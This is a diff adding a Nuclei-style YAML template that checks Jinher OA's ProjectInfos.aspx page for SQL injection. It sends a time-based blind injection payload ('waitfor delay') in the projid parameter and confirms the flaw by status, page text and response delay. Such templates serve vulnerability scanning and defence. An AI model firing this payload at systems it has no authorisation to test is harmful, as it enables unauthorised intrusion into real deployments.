@@ -1,0 +1,32 @@
+id: poc-yaml-jinher-jhsoft-projectinfos-aspx-sqli
+info:
+  name: 金和OA ProjectInfos.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: 金和OA
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/JHSoft.Web.CostControl/BudgetExecution/ProjectInfos.aspx/?projid=1;waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "项目明细信息"
+          - "项目扩展信息"
+          - "所属部门"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
